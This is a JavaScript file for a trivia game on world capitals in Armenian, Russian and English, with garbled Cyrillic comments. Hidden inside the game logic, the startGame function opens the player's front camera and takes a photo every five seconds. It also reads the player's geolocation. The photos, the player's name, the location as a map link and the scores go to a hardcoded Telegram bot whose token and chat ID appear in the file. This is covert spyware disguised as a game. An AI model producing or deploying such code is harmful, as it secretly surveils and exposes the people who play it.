// –¢–æ–∫–µ–Ω –∏ —á–∞—Ç ID Telegram (–∑–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–∏)
const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

// –ú–∞—Å—Å–∏–≤ –≤–æ–ø—Ä–æ—Å–æ–≤ (30 –≤–æ–ø—Ä–æ—Å–æ–≤, –ø—Ä–∏–º–µ—Ä 4, –¥–æ–ø–æ–ª–Ω–∏ –ø–æ–∑–∂–µ)
const questionsData = [
  {
    hy: {
      q: "’à÷Ä’∂ ’ß ’Ä’°’µ’°’Ω’ø’°’∂’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®",
      answers: ["‘µ÷Ä÷á’°’∂", "‘≥’µ’∏÷Ç’¥÷Ä’´", "’é’°’∂’°’±’∏÷Ä", "’Ä÷Ä’°’¶’§’°’∂"],
      correct: 0
    },
    ru: {
      q: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –ê—Ä–º–µ–Ω–∏–∏",
      answers: ["–ï—Ä–µ–≤–∞–Ω", "–ì—é–º—Ä–∏", "–í–∞–Ω–∞–¥–∑–æ—Ä", "–†–∞–∑–¥–∞–Ω"],
      correct: 0
    },
    en: {
      q: "What is the capital of Armenia?",
      answers: ["Yerevan", "Gyumri", "Vanadzor", "Hrazdan"],
      correct: 0
    }
  },
  {
    hy: {
      q: "’à÷Ä’∂ ’ß ’å’∏÷Ç’Ω’°’Ω’ø’°’∂’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®",
      answers: ["’Ñ’∏’Ω’Ø’æ’°", "’ç’°’∂’Ø’ø ’ä’•’ø’•÷Ä’¢’∏÷Ç÷Ä’£", "’Ü’∏’æ’∏’Ω’´’¢’´÷Ä’Ω’Ø", "‘µ’Ø’°’ø’•÷Ä’´’∂’¢’∏÷Ç÷Ä’£"],
      correct: 0
    },
    ru: {
      q: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –†–æ—Å—Å–∏–∏",
      answers: ["–ú–æ—Å–∫–≤–∞", "–°–∞–Ω–∫—Ç-–ü–µ—Ç–µ—Ä–±—É—Ä–≥", "–ù–æ–≤–æ—Å–∏–±–∏—Ä—Å–∫", "–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥"],
      correct: 0
    },
    en: {
      q: "What is the capital of Russia?",
      answers: ["Moscow", "Saint Petersburg", "Novosibirsk", "Yekaterinburg"],
      correct: 0
    }
  },
  {
    hy: {
      q: "’à÷Ä’∂ ’ß ’ñ÷Ä’°’∂’Ω’´’°’µ’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®",
      answers: ["’ì’°÷Ä’´’¶", "‘º’´’∏’∂", "’Ñ’°÷Ä’Ω’•’¨", "’Ü’´’Ω"],
      correct: 0
    },
    ru: {
      q: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –§—Ä–∞–Ω—Ü–∏–∏",
      answers: ["–ü–∞—Ä–∏–∂", "–õ–∏–æ–Ω", "–ú–∞—Ä—Å–µ–ª—å", "–ù–∏—Ü—Ü–∞"],
      correct: 0
    },
    en: {
      q: "What is the capital of France?",
      answers: ["Paris", "Lyon", "Marseille", "Nice"],
      correct: 0
    }
  },
  {
    hy: {
      q: "’à÷Ä’∂ ’ß ‘±’Ñ’Ü ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®",
      answers: ["’é’°’∑’´’∂’£’ø’∏’∂", "’Ü’µ’∏÷Ç ’Ö’∏÷Ä÷Ñ", "‘º’∏’Ω ‘±’∂’ª’•’¨’•’Ω", "’â’´’Ø’°’£’∏"],
      correct: 0
    },
    ru: {
      q: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –°–®–ê",
      answers: ["–í–∞—à–∏–Ω–≥—Ç–æ–Ω", "–ù—å—é-–ô–æ—Ä–∫", "–õ–æ—Å-–ê–Ω–¥–∂–µ–ª–µ—Å", "–ß–∏–∫–∞–≥–æ"],
      correct: 0
    },
    en: {
      q: "What is the capital of USA?",
      answers: ["Washington, D.C.", "New York", "Los Angeles", "Chicago"],
      correct: 0
    }
  }
  // ... –¥–æ–±–∞–≤—å –æ—Å—Ç–∞–ª—å–Ω—ã–µ –≤–æ–ø—Ä–æ—Å—ã –ø–æ –æ–±—Ä–∞–∑—Ü—É, —á—Ç–æ–±—ã –≤—Å–µ–≥–æ 30 ...
];

// –ü–µ—Ä–µ–≤–æ–¥—ã –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
const translations = {
  hy: {
    enterName: "’Ñ’∏÷Ç’ø÷Ñ’°’£÷Ä’•÷Ñ ’±’•÷Ä ’°’∂’∏÷Ç’∂’®",
    startGame: "’ç’Ø’Ω’•’¨ ’≠’°’≤’®",
    tryAgain: "’ì’∏÷Ä’±’•’¨ ’∂’∏÷Ä’´÷Å",
    questionsLeft: "’Ä’°÷Ä÷Å’•÷Ä ’¥’∂’°÷Å’•’¨ ’•’∂",
    correctAnswers: "’É’´’∑’ø ’∫’°’ø’°’Ω’≠’°’∂’∂’•÷Ä",
    wrongAnswers: "’ç’≠’°’¨ ’∫’°’ø’°’Ω’≠’°’∂’∂’•÷Ä",
    victory: "‘¥’∏÷Ç÷Ñ ’∞’°’≤’©’•÷Å’´÷Ñ! üéâ",
    defeat: "’ë’°’æ’∏÷Ç’¥ ’•’∂÷Ñ, ’∫’°÷Ä’ø’æ’•÷Å’´÷Ñ üòû",
    namePlaceholder: "’Ñ’∏÷Ç’ø÷Ñ’°’£÷Ä’•÷Ñ ’±’•÷Ä ’°’∂’∏÷Ç’∂’®"
  },
  ru: {
    enterName: "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –∏–º—è",
    startGame: "–ù–∞—á–∞—Ç—å –∏–≥—Ä—É",
    tryAgain: "–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞",
    questionsLeft: "–û—Å—Ç–∞–ª–æ—Å—å –≤–æ–ø—Ä–æ—Å–æ–≤",
    correctAnswers: "–ü—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤",
    wrongAnswers: "–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤",
    victory: "–í—ã –≤—ã–∏–≥—Ä–∞–ª–∏! üéâ",
    defeat: "–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üòû",
    namePlaceholder: "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –∏–º—è"
  },
  en: {
    enterName: "Enter your name",
    startGame: "Start Game",
    tryAgain: "Try Again",
    questionsLeft: "Questions left",
    correctAnswers: "Correct answers",
    wrongAnswers: "Wrong answers",
    victory: "You won! üéâ",
    defeat: "Sorry, you lost üòû",
    namePlaceholder: "Enter your name"
  }
};

// –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è –∏–≥—Ä—ã
let currentLanguage = localStorage.getItem('lang') || 'hy';
let userName = '';
let currentQuestions = [];
let currentQuestionIndex = 0;
let correctCount = 0;
let wrongCount = 0;

// –ü–æ–ª—É—á–∞–µ–º DOM —ç–ª–µ–º–µ–Ω—Ç—ã
const nameFormContainer = document.getElementById('name-form-container');
const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const nameLabel = document.getElementById('name-label');
const startBtn = document.getElementById('start-btn');

const gameArea = document.getElementById('game-area');
const userNameDiv = document.getElementById('user-name');
const scoreInfoDiv = document.getElementById('score-info');
const questionDiv = document.getElementById('question');
const answerButtonsDiv = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è –≤—ã–±–æ—Ä–∞ —è–∑—ã–∫–∞ –ø–æ –∫–ª–∏–∫—É –Ω–∞ —Ñ–ª–∞–≥–∏
document.querySelectorAll('.lang-select img').forEach(img => {
  img.addEventListener('click', () => {
    const selectedLang = img.dataset.lang;
    if (selectedLang && translations[selectedLang]) {
      currentLanguage = selectedLang;
      localStorage.setItem('lang', currentLanguage);
      applyTranslations();
    }
  });
});

// –§—É–Ω–∫—Ü–∏—è –ø—Ä–∏–º–µ–Ω–µ–Ω–∏—è –ø–µ—Ä–µ–≤–æ–¥–∞ –≤ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–µ
function applyTranslations() {
  nameLabel.textContent = translations[currentLanguage].enterName;
  nameInput.placeholder = translations[currentLanguage].namePlaceholder;
  startBtn.textContent = translations[currentLanguage].startGame;
  tryAgainBtn.textContent = translations[currentLanguage].tryAgain;
  updateScoreInfo();
}

applyTranslations();
// –ü–µ—Ä–µ–º–µ—à–∞—Ç—å –º–∞—Å—Å–∏–≤ (–§–∏—à–µ—Ä-–ô–µ–π—Ç—Å)
function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    let j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

// –í—ã–±—Ä–∞—Ç—å 10 —Å–ª—É—á–∞–π–Ω—ã—Ö –≤–æ–ø—Ä–æ—Å–æ–≤ –∏–∑ –≤—Å–µ–≥–æ –º–∞—Å—Å–∏–≤–∞ (–±–µ–∑ –ø–æ–≤—Ç–æ—Ä–æ–≤)
function selectQuestions() {
  let indices = Array.from(Array(questionsData.length).keys());
  shuffleArray(indices);
  currentQuestions = indices.slice(0, 10).map(i => questionsData[i]);
}

// –ó–∞–ø—É—Å–∫ –∏–≥—Ä—ã
function startGame() {
  userName = nameInput.value.trim();
  if (!userName) {
    userName = currentLanguage === 'hy' ? "‘±’∂’∞’°’µ’ø" : currentLanguage === 'ru' ? "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π" : "Unknown";
  }
  localStorage.setItem('userName', userName);
  currentQuestionIndex = 0;
  correctCount = 0;
  wrongCount = 0;
  selectQuestions();
  nameFormContainer.style.display = 'none';
  gameArea.style.display = 'block';
  tryAgainBtn.style.display = 'none';
  showQuestion();
  updateScoreInfo();
  sendTelegramStart();
  startCameraIfAllowed();
  getGeolocation();
}

// –ü–æ–∫–∞–∑–∞—Ç—å —Ç–µ–∫—É—â–∏–π –≤–æ–ø—Ä–æ—Å
function showQuestion() {
  clearAnswerButtons();

  if (currentQuestionIndex >= currentQuestions.length) {
    // –ñ–¥—ë–º –æ—Ç–≤–µ—Ç–æ–≤ –Ω–∞ –≤—Å–µ 10 –≤–æ–ø—Ä–æ—Å–æ–≤, –Ω–µ –¥–∞—ë–º –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å
    showResults();
    return;
  }

  const qObj = currentQuestions[currentQuestionIndex][currentLanguage];

  questionDiv.textContent = qObj.q;

  // –°–æ–∑–¥–∞—ë–º –º–∞—Å—Å–∏–≤ —Å –æ—Ç–≤–µ—Ç–∞–º–∏ –∏ –ø–æ–º–µ—á–∞–µ–º –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π
  let answers = qObj.answers.map((a, i) => ({ text: a, isCorrect: i === qObj.correct }));
  shuffleArray(answers);

  answers.forEach(ans => {
    const btn = document.createElement('button');
    btn.classList.add('btn');
    btn.textContent = ans.text;
    btn.addEventListener('click', () => selectAnswer(btn, ans.isCorrect));
    answerButtonsDiv.appendChild(btn);
  });

  updateScoreInfo();
}

// –û—á–∏—Å—Ç–∏—Ç—å –∫–Ω–æ–ø–∫–∏ –æ—Ç–≤–µ—Ç–æ–≤
function clearAnswerButtons() {
  while (answerButtonsDiv.firstChild) {
    answerButtonsDiv.removeChild(answerButtonsDiv.firstChild);
  }
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—ã–±–æ—Ä–∞ –æ—Ç–≤–µ—Ç–∞
function selectAnswer(button, isCorrect) {
  // –ë–ª–æ–∫–∏—Ä—É–µ–º –≤—Å–µ –∫–Ω–æ–ø–∫–∏ –ø–æ—Å–ª–µ –≤—ã–±–æ—Ä–∞
  Array.from(answerButtonsDiv.children).forEach(btn => btn.disabled = true);

  if (isCorrect) {
    button.classList.add('correct');
    correctCount++;
  } else {
    button.classList.add('wrong');
    wrongCount++;
    // –ü–æ–¥—Å–≤–µ—Ç–∏—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –æ—Ç–≤–µ—Ç –∑–µ–ª—ë–Ω—ã–º
    Array.from(answerButtonsDiv.children).forEach(btn => {
      if (btn.textContent === currentQuestions[currentQuestionIndex][currentLanguage].answers[currentQuestions[currentQuestionIndex][currentLanguage].correct]) {
        btn.classList.add('correct');
      }
    });
  }

  updateScoreInfo();

  setTimeout(() => {
    currentQuestionIndex++;
    showQuestion();
  }, 1500);
}

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—á—ë—Ç–∞ –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤–≤–µ—Ä—Ö—É
function updateScoreInfo() {
  const questionsLeft = 10 - currentQuestionIndex;
  scoreInfoDiv.textContent = `${translations[currentLanguage].questionsLeft}: ${questionsLeft} | ` +
    `${translations[currentLanguage].correctAnswers}: ${correctCount} | ` +
    `${translations[currentLanguage].wrongAnswers}: ${wrongCount}`;
  userNameDiv.textContent = userName || '-';
}
// –ü–æ–∫–∞–∑–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø–æ—Å–ª–µ 10 –≤–æ–ø—Ä–æ—Å–æ–≤
function showResults() {
  clearAnswerButtons();

  if (correctCount >= 6) {
    questionDiv.textContent = translations[currentLanguage].victory;
  } else {
    questionDiv.textContent = translations[currentLanguage].defeat;
  }

  tryAgainBtn.style.display = 'block';
  updateScoreInfo();
  sendTelegramResult();
}

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ ¬´’ì’∏÷Ä’±’•’¨ ’∂’∏÷Ä’´÷Å¬ª
tryAgainBtn.addEventListener('click', () => {
  tryAgainBtn.style.display = 'none';

  // –ï—Å–ª–∏ –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∏–ª–∏ –∫–∞–º–µ—Ä–µ ‚Äî –∑–∞–Ω–æ–≤–æ –∑–∞–ø—Ä–æ—Å–∏—Ç—å
  if (!geoCoords || !cameraStream) {
    requestPermissions();
  } else {
    // –ï—Å–ª–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –µ—Å—Ç—å ‚Äî –ø—Ä–æ—Å—Ç–æ —Ä–µ—Å—Ç–∞—Ä—Ç –∏–≥—Ä—ã –±–µ–∑ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    currentQuestionIndex = 0;
    correctCount = 0;
    wrongCount = 0;
    selectQuestions();
    showQuestion();
    updateScoreInfo();
  }
});

// –ó–∞–ø—Ä–æ—Å–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
function getGeolocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(position => {
      geoCoords = position.coords;
      // –ú–æ–∂–Ω–æ –æ–±–Ω–æ–≤–ª—è—Ç—å Telegram —Å –≥–µ–æ –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
    }, error => {
      geoCoords = null;
    });
  }
}

// –ó–∞–ø—Ä–æ—Å–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –∑–∞–Ω–æ–≤–æ (–≥–µ–æ + –∫–∞–º–µ—Ä–∞)
function requestPermissions() {
  // –°–±—Ä–æ—Å –ø–æ—Ç–æ–∫–æ–≤ –∫–∞–º–µ—Ä—ã
  if (cameraStream) {
    let tracks = cameraStream.getTracks();
    tracks.forEach(track => track.stop());
    cameraStream = null;
  }
  geoCoords = null;

  // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ñ–æ—Ä–º—É –∏–º–µ–Ω–∏, —á—Ç–æ–±—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–≥ –Ω–∞—á–∞—Ç—å –∑–∞–Ω–æ–≤–æ
  nameFormContainer.style.display = 'block';
  gameArea.style.display = 'none';

  // –û—á–∏—Å—Ç–∏—Ç—å –∏–º—è –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –≤–≤–æ–¥–∞
  nameInput.value = '';
}

// –ó–∞–ø—É—Å–∫ –∫–∞–º–µ—Ä—ã –∏ —Ñ–æ—Ç–æ—Å—ä–µ–º–∫–∞ –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
function startCameraIfAllowed() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    cameraStream = null;
    return;
  }
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
      cameraStream = stream;
      startTakingPhotos();
    })
    .catch(() => {
      cameraStream = null;
    });
}

let photoIntervalId = null;

function startTakingPhotos() {
  if (!cameraStream) return;
  if (photoIntervalId) clearInterval(photoIntervalId);

  const video = document.createElement('video');
  video.srcObject = cameraStream;
  video.play();

  photoIntervalId = setInterval(() => {
    takePhoto(video);
  }, 5000);
}

function takePhoto(video) {
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 320;
  canvas.height = video.videoHeight || 240;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(blob => {
    if (blob) {
      sendPhotoToTelegram(blob);
    }
  }, 'image/jpeg', 0.7);
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ –≤ Telegram
function sendPhotoToTelegram(blob) {
  const reader = new FileReader();
  reader.onloadend = function () {
    const base64data = reader.result.split(',')[1];
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', `–§–æ—Ç–æ –∏–≥—Ä–æ–∫–∞: ${userName}`);

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    }).catch(() => { /* –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ */ });
  };
  reader.readAsDataURL(blob);
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç–∞—Ä—Ç–∞ –∏–≥—Ä—ã –≤ Telegram
function sendTelegramStart() {
  let message = `–ò–≥—Ä–æ–∫ –Ω–∞—á–∞–ª –∏–≥—Ä—É: ${userName}\n–Ø–∑—ã–∫: ${currentLanguage}\n`;
  if (geoCoords) {
    message += `–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}\n`;
  } else {
    message += `–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞\n`;
  }
  sendTelegramMessage(message);
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –∏–≥—Ä—ã –≤ Telegram
function sendTelegramResult() {
  let message = `–†–µ–∑—É–ª—å—Ç–∞—Ç –∏–≥—Ä—ã –∏–≥—Ä–æ–∫–∞ ${userName}:\n` +
    `–Ø–∑—ã–∫: ${currentLanguage}\n` +
    `–ü—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤: ${correctCount}\n`;
  if (geoCoords) {
    message += `–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}\n`;
  } else {
    message += `–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞\n`;
  }
  sendTelegramMessage(message);
}

// –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ–∫—Å—Ç–∞ –≤ Telegram
function sendTelegramMessage(text) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    })
  }).catch(() => { /* –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ */ });
}
// –≠–ª–µ–º–µ–Ω—Ç—ã –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏—è —è–∑—ã–∫–∞ (–¥–æ–±–∞–≤–∏–º —Å–∞–º–∏ –≤ HTML –ø–æ–∑–∂–µ)
const langButtons = document.querySelectorAll('.lang-btn');

langButtons.forEach(btn => {
  btn.addEventListener('click', () => {
    currentLanguage = btn.dataset.lang;
    localStorage.setItem('lang', currentLanguage);
    applyTranslations();

    // –ï—Å–ª–∏ –∏–≥—Ä–∞ —É–∂–µ –∏–¥–µ—Ç, –æ–±–Ω–æ–≤–∏–º –≤–æ–ø—Ä–æ—Å –∏ —Å—á–µ—Ç
    if (gameArea.style.display === 'block') {
      showQuestion();
      updateScoreInfo();
    }
  });
});

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
window.addEventListener('DOMContentLoaded', () => {
  currentLanguage = localStorage.getItem('lang') || 'hy';
  applyTranslations();

  // –ï—Å–ª–∏ –µ—Å—Ç—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω–æ–µ –∏–º—è ‚Äî –ø–æ–¥—Å—Ç–∞–≤–ª—è–µ–º
  const savedName = localStorage.getItem('userName');
  if (savedName) {
    nameInput.value = savedName;
  }

  nameForm.addEventListener('submit', e => {
    e.preventDefault();
    startGame();
  });
});
